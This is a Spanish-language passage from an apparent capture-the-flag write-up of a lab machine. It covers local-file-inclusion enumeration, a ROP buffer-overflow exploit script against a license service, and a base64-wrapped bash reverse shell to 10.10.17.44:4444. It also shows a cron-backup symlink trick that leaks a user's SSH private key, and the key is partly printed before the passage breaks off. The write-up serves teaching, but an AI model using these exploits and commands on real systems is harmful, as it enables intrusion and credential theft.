/proc\u0026lt;PID\u0026gt;/cmdline para saber el comando usado para iniciar el proceso. Vamos a usar fuerza bruta para enumerar procesos y ver si hay alguno que se ejecute en el puerto 1337:\n$ for i in {1..1000}; do echo -n \"$i: \"; curl \"10.10.11.154?page=/proc/$i/cmdline\" -so -; echo; done | grep -a ': .' 411: /usr/bin/activate_license1337 576: nginx: worker process 577: nginx: worker process  Nótese que hay algunos bytes nulos:\n$ curl '10.10.11.154?page=/proc/411/cmdline' -so - | xxd 00000000: 2f75 7372 2f62 696e 2f61 6374 6976 6174 /usr/bin/activat 00000010: 655f 6c69 6365 6e73 6500 3133 3337 00 e_license.1337. $ curl '10.10.11.154?page=/proc/426/cmdline' -so - | tr '\\0' ' ' /usr/bin/activate_license 1337  Genial, parece que tenemos un archivo llamado /usr/bin/activate_license, vamos a descargarlo:\n$ curl '10.10.11.154?page=/usr/bin/activate_license' \u0026gt; activate_license $ file activate_license activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped  Análisis de un binario Se trata de un binario ELF de 64 bits\u0026hellip; Esto se pone interesante\u0026hellip; El hecho de que la clave de licencia tenga un tamaño fijo indica que el binario podría ser vulnerable a Buffer Overflow. Estas son las protecciones del binario:\n$ checksec activate_license [*] './activate_license' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled  Mmm, muy protegido\u0026hellip; Necesitaremos al menos dos direcciones en tiempo de ejecución: una de Glibc para burlar ASLR y otra del binario para burlar PIE. Además, como NX está habilitado, tendremos que usar Return Oriented Programming (ROP).\nVamos a emplear Ghidra para descompilar el binario y analizarlo. Esta es la función main:\nint main(int argc, char **argv) { int iVar1; __pid_t _Var2; int *piVar3; char *pcVar4; char clientaddr_s[16]; sockaddr_in clientaddr; socklen_t clientaddrlen; sockaddr_in server; uint16_t port; int clientfd; int serverfd; if (argc != 2) { error(\"specify port to bind to\"); } iVar1 = __isoc99_sscanf(argv[1], \"%hu\", \u0026amp;port); if (iVar1 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } printf(\"[+] starting server listening on port %d\\n\", (ulong) port); server.sin_family = 2; server.sin_addr = htonl(0x7f000001); server.sin_port = htons(port); serverfd = socket(2, 1, 6); if (serverfd == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } iVar1 = bind(serverfd, (sockaddr *) \u0026amp;server, 0x10); if (iVar1 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } iVar1 = listen(serverfd, 100); if (iVar1 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } puts(\"[+] listening ...\"); while (true) { while (true) { clientfd = accept(serverfd, (sockaddr *) \u0026amp;clientaddr, \u0026amp;clientaddrlen); if (clientfd != -1) break; fwrite(\"Error: accepting client\\n\", 1, 0x18, stderr); } inet_ntop(2, \u0026amp;clientaddr.sin_addr, clientaddr_s, 0x10); printf(\"[+] accepted client connection from %s:%d\\n\", clientaddr_s, (ulong) clientaddr.sin_port); _Var2 = fork(); if (_Var2 == 0) break; __sysv_signal(0x11, (__sighandler_t) 0x1); close(clientfd); } close(serverfd); activate_license(clientfd); /* WARNING: Subroutine does not return */ exit(0); }  Simplemente inicia un servidor de sockets en el puerto 1337. Cada vez que se recibe una nueva conexión, el proceso usa fork (que significa que el proceso padre sigue escuchando por nuevas conexiones y no se romperá). El proceso hijo ejecuta la función activate_license:\nvoid activate_license(int sockfd) { int iVar1; ssize_t sVar2; int *piVar3; char *pcVar4; sqlite3_stmt *stmt; sqlite3 *db; uint32_t msglen; char buffer[512]; sVar2 = read(sockfd, \u0026amp;msglen, 4); if (sVar2 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } msglen = ntohl(msglen); printf(\"[+] reading %d bytes\\n\", (ulong) msglen); sVar2 = read(sockfd, buffer, (ulong) msglen); if (sVar2 == -1) { piVar3 = __errno_location(); pcVar4 = strerror(*piVar3); error(pcVar4); } iVar1 = sqlite3_open(\"license.sqlite\", \u0026amp;db); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } sqlite3_busy_timeout(db, 2000); iVar1 = sqlite3_exec(db, \"CREATE TABLE IF NOT EXISTS license ( id INTEGER PRIMARY KEY AUTOINCREMENT, license_key TEXT)\", 0, 0, 0); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_prepare_v2(db, \"INSERT INTO license (license_key) VALUES (?)\", 0xffffffff, \u0026amp;stmt, 0); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_bind_text(stmt, 1, buffer, 0x200, 0); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_step(stmt); if (iVar1 != 0x65) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_reset(stmt); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_finalize(stmt); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } iVar1 = sqlite3_close(db); if (iVar1 != 0) { pcVar4 = (char *) sqlite3_errmsg(db); error(pcVar4); } printf(\"[+] activated license: %s\\n\", buffer); return; }  Podríamos mirar si las consultas de SQL son inyectables, pero no lo son. Entonces, el camino tiene que ser mediante explotación de binarios. La vulnerabilidad de Buffer Overflow está aquí:\nvoid activate_license(int sockfd) { // ... int iVar1; ssize_t sVar2; uint32_t msglen; char buffer[512]; sVar2 = read(sockfd, \u0026amp;msglen, 4); // ... msglen = ntohl(msglen); printf(\"[+] reading %d bytes\\n\", (ulong) msglen); sVar2 = read(sockfd, buffer, (ulong) msglen); // ... }  La primera instrucción read lee el tamaño del archivo, y la segunda copia el contenido del archivo en buffer. Como podemos controlar el tamaño del archivo, podemos desbordar el buffer reservado de buffer (que es 512 bytes) y por tanto modificar la dirección de retorno guardada en la pila (stack).\nPreparación del exploit El binario no puede ser explotado mediante un ataque Ret2Libc común. El problema es que no tenemos comunicación directa con el binario. En su lugar, tenemos que enviar el payload como un archivo al servidor PHP y este será pasado al binario. No obtendremos ninguna salida, por lo que no podemos usar fugas de memoria.\nSin embargo, podemos obtener la información necesaria de /proc/\u0026lt;PID\u0026gt;/maps:\n$ curl '10.10.11.154?page=/proc/411/maps' 5631036d6000-5631036d7000 r--p 00000000 08:01 2408 /usr/bin/activate_license 5631036d7000-5631036d8000 r-xp 00001000 08:01 2408 /usr/bin/activate_license 5631036d8000-5631036d9000 r--p 00002000 08:01 2408 /usr/bin/activate_license 5631036d9000-5631036da000 r--p 00002000 08:01 2408 /usr/bin/activate_license 5631036da000-5631036db000 rw-p 00003000 08:01 2408 /usr/bin/activate_license 563104ac4000-563104ae5000 rw-p 00000000 00:00 0 [heap] 7f8f07aa9000-7f8f07aab000 rw-p 00000000 00:00 0 7f8f07aab000-7f8f07aac000 r--p 00000000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07aac000-7f8f07aae000 r-xp 00001000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07aae000-7f8f07aaf000 r--p 00003000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07aaf000-7f8f07ab0000 r--p 00003000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07ab0000-7f8f07ab1000 rw-p 00004000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so 7f8f07ab1000-7f8f07ab8000 r--p 00000000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07ab8000-7f8f07ac8000 r-xp 00007000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07ac8000-7f8f07acd000 r--p 00017000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07acd000-7f8f07ace000 r--p 0001b000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07ace000-7f8f07acf000 rw-p 0001c000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so 7f8f07acf000-7f8f07ad3000 rw-p 00000000 00:00 0 7f8f07ad3000-7f8f07ae2000 r--p 00000000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07ae2000-7f8f07b7c000 r-xp 0000f000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07b7c000-7f8f07c15000 r--p 000a9000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07c15000-7f8f07c16000 r--p 00141000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07c16000-7f8f07c17000 rw-p 00142000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so 7f8f07c17000-7f8f07c3c000 r--p 00000000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07c3c000-7f8f07d87000 r-xp 00025000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07d87000-7f8f07dd1000 r--p 00170000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07dd1000-7f8f07dd2000 ---p 001ba000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07dd2000-7f8f07dd5000 r--p 001ba000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07dd5000-7f8f07dd8000 rw-p 001bd000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f8f07dd8000-7f8f07ddc000 rw-p 00000000 00:00 0 7f8f07ddc000-7f8f07dec000 r--p 00000000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07dec000-7f8f07ee4000 r-xp 00010000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07ee4000-7f8f07f18000 r--p 00108000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07f18000-7f8f07f1c000 r--p 0013b000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07f1c000-7f8f07f1f000 rw-p 0013f000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 7f8f07f1f000-7f8f07f21000 rw-p 00000000 00:00 0 7f8f07f26000-7f8f07f27000 r--p 00000000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f27000-7f8f07f47000 r-xp 00001000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f47000-7f8f07f4f000 r--p 00021000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f50000-7f8f07f51000 r--p 00029000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f51000-7f8f07f52000 rw-p 0002a000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f8f07f52000-7f8f07f53000 rw-p 00000000 00:00 0 7ffc8b8b8000-7ffc8b8d9000 rw-p 00000000 00:00 0 [stack] 7ffc8b8de000-7ffc8b8e2000 r--p 00000000 00:00 0 [vvar] 7ffc8b8e2000-7ffc8b8e4000 r-xp 00000000 00:00 0 [vdso]  Aquí tenemos la dirección base del binario (0x5631036d6000), la dirección base de Glibc (0x7f8f07c17000) y también el comienzo de la pila (0x7ffc8b8b8000). Estos tres valores serán útiles para la explotación.\nAdemás, vamos a descargarnos la librería Glibc de la máquina para desarrollar el exploit:\n$ curl '10.10.11.154?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so' -o libc.so.6  Desarrollo del exploit El objetivo del exploit es llamar a system en Glibc (tenemos su dirección real) y usar un comando de reverse shell como primer argmento. Como se trata de un comando personalizado que no está en Glibc o en el binario, tiene que ser guardado en la pila (y por eso necesitamos una dirección de la pila). Por tanto, queremos lo siguiente:\n Que $rdi tenga la dirección del comando Llamar a system en Glibc  Se trata de un binario de 64 bits, por lo que la convención de llamadas dice que los argumentos se pasan a las funciones a través de los registros (en orden: $rdi, $rsi, $rdx, $rcx\u0026hellip;). Esta vez, llamaremos a system, que usa un solo argumento que es el puntero a la string (que será el comando que queremos ejecutar).\nComo NX está habilitado, tenemos que usar ROP para configurar el valor de $rdi usando un gadget pop rdi; ret. ROP nos permitirá redirigir el flujo de ejecución a direcciones específicas que ejecutarán las instrucciones que queremos y retornarán a la siguiente dirección de la pila, donde estará el siguiente gadget (de ahí el término ROP chain).\nPodemos encontrar gadgets en el binario o Glibc, no importa esta vez:\n$ ROPgadget --binary activate_license | grep ': pop rdi ; ret$' 0x000000000000181b : pop rdi ; ret  El valor 0x181b es solo un offset. Como el binario tiene PIE activado, la base del binario es aleatoria y todas las direcciones se calculan como offsets a la dirección base. Como tenemos la dirección base de /proc/\u0026lt;PID\u0026gt;/maps, sabemos la dirección real del gadget en tiempo de ejecución.\nLuego, tenemos que encontrar el offset de system en Glibc:\n$ readelf -s libc.so.6 | grep system 237: 000000000012d5e0 99 FUNC GLOBAL DEFAULT 14 svcerr_systemerr@@GLIBC_2.2.5 619: 0000000000048e50 45 FUNC GLOBAL DEFAULT 14 __libc_system@@GLIBC_PRIVATE 1430: 0000000000048e50 45 FUNC WEAK DEFAULT 14 system@@GLIBC_2.2.5  De nuevo, 0x48e50 es un offset porque la dirección base de Glibc es aleatoria debido al ASLR. Además, tenemos la dirección base de Glibc en tiempo de ejecución desde antes.\nGenial, ahora tenemos que ver qué cantidad de caracteres necesitamos para sobrescribir la dirección de retorno guardada en la pila. Por experiencia en explotación en 64 bits, se sabe que si el buffer reservado es $x$, entonces el offset es normalmente $x + 8$ (si no hay canario). Entonces, el offset es 520 esta vez. Otra manera de encontrarlo es con patrones en GDB.\nUtilicé un script en Python para coger las direcciones desde /proc/\u0026lt;PID\u0026gt;/maps, crear el payload y enviarlo al servidor. Se puede encontrar aquí: first_exploit.py.\nLa función que construye el payload es esta:\ndef craft_payload(pid, cmd, stack_offset): elf_address, glibc_address, stack_address = get_addresses(pid) pop_rdi_ret = elf_address + 0x0181b system = glibc_address + 0x48e50 padding = b' ' * 200 cmd = padding + cmd.encode() + b'\\0' offset = 520 junk = b'A' * offset payload = junk payload += p64(pop_rdi_ret) payload += p64(stack_address + stack_offset) payload += p64(system) payload += cmd return {'licensefile': ('tmp_name', payload)}  Nótese que el comando que se ejecuta se introduce después de la ROP chain y se rellena com 200 espacios. Esto es importante porque no sabemos la dirección exacta en la que se sitúa nuestro comando en la pila, por lo que tenemos que hacer fuerza bruta. El relleno nos permite tener más tolerancia en el puntero porque podemos saltar al comienzo de los espacios, en el medio o justo donde comienza el comando (tolerancia de 200 direcciones) y el comando aún se ejecuta. Además, el comando se termina con un byte nulo.\nEsta es la función main, que tiene dos estrategias y envía el payload al servidor PHP como archivo:\ndef main(): if len(sys.argv) != 3 and len(sys.argv) != 4: print(f'[!] Usage: python3 {sys.argv[0]} \u0026lt;PID\u0026gt; \u0026lt;cmd\u0026gt; [stack offset]') return pid, cmd = sys.argv[1], sys.argv[2] if len(sys.argv) == 4: stack_offset = int(sys.argv[3], 16) requests.post(f'http://{ip}/activate_license.php', files=craft_payload(pid, cmd, stack_offset)) print('[+] Sent payload. Check listener') return print('[+] Starting brute force on stack offset') for stack_offset in range(0x21000, 0, -128): print(f'[*] Stack offset: {hex(stack_offset)}') time.sleep(1) requests.post(f'http://{ip}/activate_license.php', files=craft_payload(pid, cmd, stack_offset))  La primera estrategia es para hacer fuerza bruta a una dirección de la pila usando un offset (comenzando por 0x21000, que es la cima de la pila, y descendiendo):\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ python3 first_exploit.py 411 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' [+] Starting brute force on stack offset [*] Stack offset: 0x21000 [*] Stack offset: 0x20f80 [*] Stack offset: 0x20f00 [*] Stack offset: 0x20e80 [*] Stack offset: 0x20e00 [*] Stack offset: 0x20d80 [*] Stack offset: 0x20d00 [*] Stack offset: 0x20c80 [*] Stack offset: 0x20c00 [*] Stack offset: 0x20b80 [*] Stack offset: 0x20b00 [*] Stack offset: 0x20a80 [*] Stack offset: 0x20a00 [*] Stack offset: 0x20980 [*] Stack offset: 0x20900 [*] Stack offset: 0x20880 [*] Stack offset: 0x20800 [*] Stack offset: 0x20780 [*] Stack offset: 0x20700 [*] Stack offset: 0x20680 [*] Stack offset: 0x20600 [*] Stack offset: 0x20580 [*] Stack offset: 0x20500 [*] Stack offset: 0x20480 ^C [!] Exiting...  Usando como comando una reverse shell un ping o una petición web, podemos adivinar el offset en el stack. Aunque no es estrictamente necesario si se usa una reverse shell, podemos ejecutar el exploit de nuevo indicando el offset para conseguir ejecución remota de comandos (RCE) instantáneamente:\n$ python3 first_exploit.py 411 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' 0x20500 [+] Sent payload. Check listener  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.154. Ncat: Connection from 10.10.11.154:53848. bash: cannot set terminal process group (411): Inappropriate ioctl for device bash: no job control in this shell www-data@retired:~$ script /dev/null -c bash script /dev/null -c bash Script started, output log file is '/dev/null'. www-data@retired:~$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@retired:~$ export TERM=xterm www-data@retired:~$ export SHELL=bash www-data@retired:~$ stty rows 50 columns 158  Existen más maneras de explotar el binario. En este second_exploit.py uso una dirección del binario con permisos de escritura para guardar el comando de reverse shell usando una primitiva \u0026ldquo;write-what-where\u0026rdquo; en bloques de 8 bytes mediante gadgets pop rax; ret, pop rdi; ret y luego usar mov qword ptr [rax], rdi; ret para mover los bloques de comandos a las direcciones escribibles (explicación detallada aquí).\nAdemás, es posible llamar a mprotect para modificar los permisos del stack y configurarla como ejecutable, de manera que podemos introducir shellcode en la pila y ejecutarlo para obtener una reverse shell. Esta técnica se utiliza en third_exploit.py (explicación detallada aquí).\nEnumeración del sistema Lo primero que notamos es que hay algunos archivos ZIP en /var/www:\nwww-data@retired:~$ ls -la total 1760 drwxrwsrwx 3 www-data www-data 4096 Apr 3 12:16 . drwxr-xr-x 12 root root 4096 Mar 11 14:36 .. -rw-r--r-- 1 dev www-data 505153 Apr 3 12:14 2022-04-03_12-14-03-html.zip -rw-r--r-- 1 dev www-data 505153 Apr 3 12:15 2022-04-03_12-15-03-html.zip -rw-r--r-- 1 dev www-data 505153 Apr 3 12:16 2022-04-03_12-16-03-html.zip drwxrwsrwx 5 www-data www-data 4096 Mar 11 14:36 html -rw-r--r-- 1 www-data www-data 262144 Apr 3 12:15 license.sqlite  Todos contienen una copia de seguridad del código fuente del servidor:\nwww-data@retired:~$ unzip -l 2022-04-03_12-16-03-html.zip Archive: 2022-04-03_12-16-03-html.zip Length Date Time Name --------- ---------- ----- ---- 0 2022-03-11 14:36 var/www/html/ 0 2022-03-11 14:36 var/www/html/js/ 1636 2021-10-13 02:59 var/www/html/js/scripts.js 585 2021-10-13 02:58 var/www/html/activate_license.php 0 2022-03-11 14:36 var/www/html/assets/ 23462 2021-10-13 02:59 var/www/html/assets/favicon.ico 0 2022-03-11 14:36 var/www/html/assets/img/ 333 2021-10-13 02:59 var/www/html/assets/img/close-icon.svg 14220 2021-10-13 02:59 var/www/html/assets/img/navbar-logo.svg 0 2022-03-11 14:36 var/www/html/assets/img/about/ 10187 2021-10-13 02:59 var/www/html/assets/img/about/2.jpg 16175 2021-10-13 02:59 var/www/html/assets/img/about/4.jpg 18029 2021-10-13 02:59 var/www/html/assets/img/about/3.jpg 19668 2021-10-13 02:59 var/www/html/assets/img/about/1.jpg 0 2022-03-11 14:36 var/www/html/assets/img/logos/ 3223 2021-10-13 02:59 var/www/html/assets/img/logos/facebook.svg 4137 2021-10-13 02:59 var/www/html/assets/img/logos/microsoft.svg 3282 2021-10-13 02:59 var/www/html/assets/img/logos/google.svg 2284 2021-10-13 02:59 var/www/html/assets/img/logos/ibm.svg 0 2022-03-11 14:36 var/www/html/assets/img/team/ 61067 2021-10-13 02:59 var/www/html/assets/img/team/2.jpg 57725 2021-10-13 02:59 var/www/html/assets/img/team/3.jpg 40338 2021-10-13 02:59 var/www/html/assets/img/team/1.jpg 238317 2021-10-13 02:59 var/www/html/assets/img/header-bg.jpg 4144 2022-03-11 11:34 var/www/html/beta.html 11414 2021-10-13 02:58 var/www/html/default.html 348 2022-03-11 11:29 var/www/html/index.php 0 2022-03-11 14:36 var/www/html/css/ 219875 2021-10-13 02:59 var/www/html/css/styles.css --------- ------- 750449 29 files  Además, los archivos ZIP pertenecen al usuario dev y al grupo www-data. Cada minuto, aparece un nuevo archivo ZIP, vamos a buscar por backup y luego a ver si hay alguna tarea Cron:\nwww-data@retired:~$ cat /usr/bin/webbackup  #!/bin/bash set -euf -o pipefail cd /var/www/ SRC=/var/www/html DST=\"/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip\" /usr/bin/rm --force -- \"$DST\" /usr/bin/zip --recurse-paths \"$DST\" \"$SRC\" KEEP=10 /usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \\ | sort --zero-terminated --numeric-sort --reverse \\ | while IFS= read -r -d '' backup; do if [ \"$KEEP\" -le 0 ]; then /usr/bin/rm --force -- \"$backup\" fi KEEP=\"$((KEEP-1))\" done  Aunque date y sort se llaman con rutas relativas, no existe vulnerabilidad de PATH hijacking.\nMovimiento lateral al usuario dev En su lugar, podemos crear un enlace simbólico que apunte a /home/dev/.ssh/id_rsa, de manera que se comprime en un archivo ZIP y luego lo podemos extraer:\nwww-data@retired:~/html$ ln -s /home/dev/.ssh/id_rsa dev_id_rsa  Después de un minuto, el nuevo archivo ZIP contiene la clave privada de SSH de dev:\nwww-data@retired:~/html$ cd .. www-data@retired:~$ unzip -l 2022-04-03_13-14-04-html.zip Archive: 2022-04-03_13-14-04-html.zip Length Date Time Name --------- ---------- ----- ---- 0 2022-04-03 13:13 var/www/html/ 0 2022-03-11 14:36 var/www/html/js/ 1636 2021-10-13 02:59 var/www/html/js/scripts.js 585 2021-10-13 02:58 var/www/html/activate_license.php 0 2022-03-11 14:36 var/www/html/assets/ 23462 2021-10-13 02:59 var/www/html/assets/favicon.ico 0 2022-03-11 14:36 var/www/html/assets/img/ 333 2021-10-13 02:59 var/www/html/assets/img/close-icon.svg 14220 2021-10-13 02:59 var/www/html/assets/img/navbar-logo.svg 0 2022-03-11 14:36 var/www/html/assets/img/about/ 10187 2021-10-13 02:59 var/www/html/assets/img/about/2.jpg 16175 2021-10-13 02:59 var/www/html/assets/img/about/4.jpg 18029 2021-10-13 02:59 var/www/html/assets/img/about/3.jpg 19668 2021-10-13 02:59 var/www/html/assets/img/about/1.jpg 0 2022-03-11 14:36 var/www/html/assets/img/logos/ 3223 2021-10-13 02:59 var/www/html/assets/img/logos/facebook.svg 4137 2021-10-13 02:59 var/www/html/assets/img/logos/microsoft.svg 3282 2021-10-13 02:59 var/www/html/assets/img/logos/google.svg 2284 2021-10-13 02:59 var/www/html/assets/img/logos/ibm.svg 0 2022-03-11 14:36 var/www/html/assets/img/team/ 61067 2021-10-13 02:59 var/www/html/assets/img/team/2.jpg 57725 2021-10-13 02:59 var/www/html/assets/img/team/3.jpg 40338 2021-10-13 02:59 var/www/html/assets/img/team/1.jpg 238317 2021-10-13 02:59 var/www/html/assets/img/header-bg.jpg 4144 2022-03-11 11:34 var/www/html/beta.html 11414 2021-10-13 02:58 var/www/html/default.html 348 2022-03-11 11:29 var/www/html/index.php 2590 2022-03-11 11:12 var/www/html/dev_id_rsa 0 2022-03-11 14:36 var/www/html/css/ 219875 2021-10-13 02:59 var/www/html/css/styles.css --------- ------- 753039 30 files  Vamos a extraer los archivos:\nwww-data@retired:~$ mv 2022-04-03_13-14-04-html.zip /tmp www-data@retired:~$ cd /tmp www-data@retired:/tmp$ unzip 2022-04-03_13-14-04-html.zip Archive: 2022-04-03_13-14-04-html.zip creating: var/www/html/ creating: var/www/html/js/ inflating: var/www/html/js/scripts.js inflating: var/www/html/activate_license.php creating: var/www/html/assets/ inflating: var/www/html/assets/favicon.ico creating: var/www/html/assets/img/ inflating: var/www/html/assets/img/close-icon.svg inflating: var/www/html/assets/img/navbar-logo.svg creating: var/www/html/assets/img/about/ inflating: var/www/html/assets/img/about/2.jpg inflating: var/www/html/assets/img/about/4.jpg inflating: var/www/html/assets/img/about/3.jpg inflating: var/www/html/assets/img/about/1.jpg creating: var/www/html/assets/img/logos/ inflating: var/www/html/assets/img/logos/facebook.svg inflating: var/www/html/assets/img/logos/microsoft.svg inflating: var/www/html/assets/img/logos/google.svg inflating: var/www/html/assets/img/logos/ibm.svg creating: var/www/html/assets/img/team/ inflating: var/www/html/assets/img/team/2.jpg inflating: var/www/html/assets/img/team/3.jpg inflating: var/www/html/assets/img/team/1.jpg inflating: var/www/html/assets/img/header-bg.jpg inflating: var/www/html/beta.html inflating: var/www/html/default.html inflating: var/www/html/index.php inflating: var/www/html/dev_id_rsa creating: var/www/html/css/ extracting: var/www/html/css/styles.css www-data@retired:/tmp$ cat var/www/html/dev_id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEA58qqrW05/urHKCqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yf db6Nzw5wfLeLD4uDt8k9M7RPgkdnIRwdNFxleNHuHWmK0j7OOQ0rUsrs8LudOdkHGu0qQr AnCIpK3Gb74zh6pe03zHVcZyLR2tXWmoXqRF8gE2hsry/AECZRSfaYRhac6lASRZD74bQb xOeSuNyMfCsbJ/xKvlupiMKcbD+7RHysCSM6xkgBoJ+rraSpYTiXs/vihkp6pN2jMRa/ee ADRNWoyqU7LVsKwhZ//AxKjJSvDSnaUeIDaKZ6e4XYsOKTXX3Trh7u9Bjv2YFD8DRDEmDI 5d+t6Imws8370a/5Z2z7C7jfCpzDATek0NIqLi3jEmI/8vLO9xIckjaNVoqw/BVKNqjd03 KKK2Y0c5DRArFmwkJdmbGxwzyTV8oQZdjw0mVBFjbdQ0iiQBEFGNP9/zpT//ewaosZYROE 4FHXNEIq23Z3SxUNyUeLqkI8Mlf0McBmvc/ozGR5AAAFgKXd9Tyl3fU8AAAAB3NzaC1yc2 EAAAGBAOfKqq1tOf7qxygqgoHCD4RpGutGPp0HJ4B0uiLxuOIHG98NBzf8n3W+jc8OcHy3 iw+Lg7fJPTO0T4JHZyEcHTRcZXjR7h1pitI+zjkNK1LK7PC7nTnZBxrtKkKwJwiKStxm++ M4eqXtN8x1XGci0drV1pqF6kRfIBNobK8vwBAmUUn2mEYWnOpQEkWQ++G0G8TnkrjcjHwr Gyf8Sr5bqYjCnGw/u0R8rAkjOsZIAaCfq62kqWE4l7P74oZKeqTdozEWv3ngA0TVqMqlOy 1bCsIWf/wMSoyUrw0p2lHiA2imenuF2LDik119064e7vQY79mBQ/A0QxJgyOXfreiJsLPN +9Gv+Wds+wu43wqcwwE3pNDSKi4t4xJiP/LyzvcSHJI2jVaKsPwVSjao3dNyiitmNHOQ0Q KxZsJCXZmxscM8k1fKEGXY8NJlQRY23UNIokARBRjT/f86U//3sGqLGWEThOBR1zRCKtt2 d0sVDclHi6pCPDJX9DHAZr3P6MxkeQAAAAMBAAEAAAGAEOqioDubgvZBiLXphmzSUxiUpV 0gDrfJ8z8RoqE/nAdmylWaFET0olRA5z6niQKgPIczGsOuGsrrDpgFd84kd4DSywmPNkhQ oF2DEXjbk5RJzJv0spcbRKTQc8OFZcMqCYHemkux79ArRVm/X6uT40O+ANMLMOg8YA47+G EkxEj3n81Geb8GvrcPTlJxf5x0dl9sPt+hxSIkPjvUfKYV7mw9nEzebvYmXBhdHsF8lOty TR76WaUWtUUJ2EExSD0Am3DQMq4sgLT9tb+rlU7DoHtoSPX6CfdInH9ciRnLG1kVbDaEaa NT2anONVOswKJWVYgUN83cCCPyRzQJLPC6u7uSdhXU9sGuN34m5wQYp3wFiRnIdKgTcnI8 IoVRX0rnTtBUWeiduhdi2XbYh5OFFjh77tWCi9eTR7wopwUGR0u5sbDZYGPlOWNk22+Ncw qQMIq0f4TBegkOUNV85gyEkIwifjgvfdw5FJ4zhoVbbevgo7IVz3gIYfDjktTF+n9dAAAA wDyIzLbm4JWNgNhrc7Ey8wnDEUAQFrtdWMS/UyZY8lpwj0uVw8wdXiV8rFFPZezpyio9nr xybImQU+QgCBdqQSavk4OJetk29fk7X7TWmKw5dwLuEDbJZo8X/MozmhgOR9nhMrBXR2g/ yJuCfKA0rcKby+3TSbl/uCk8hIPUDT+BNYyR5yBggI7+DKQBvHa8eTdvqGRnJ9jUnP6tfB 